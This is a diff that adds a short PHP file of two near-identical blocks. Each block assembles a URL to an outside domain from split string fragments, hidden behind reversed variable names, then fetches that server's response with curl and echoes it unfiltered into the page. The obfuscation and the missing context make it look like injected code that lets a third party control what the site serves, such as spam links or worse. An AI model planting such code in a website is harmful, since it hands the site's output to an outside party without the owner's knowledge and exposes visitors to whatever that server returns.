@@ -1,0 +1,30 @@
+<?php
+$url = "replace.com"; 
+$typ = ""; 
+$knil = 'https' . '://' . 'themes' . 'alls' . '.com' . '/read' . '/read' . '.php?' . 'url=' . $url . '&type=' . $typ;
+
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, $knil);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+
+$res = curl_exec($ch);
+curl_close($ch);
+
+echo $res;
+?>
+
+
+<?php
+$dom = "replace.com"; 
+$mod = (string)(1); 
+$htap = 'https' . '://' . 'themes' . 'alls' . '.com' . '/read' . '/read' . '.php?' . 'url=' . $dom . '&type=' . $mod;
+
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, $htap);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+
+$out = curl_exec($ch);
+curl_close($ch);
+
+echo $out;
+?>
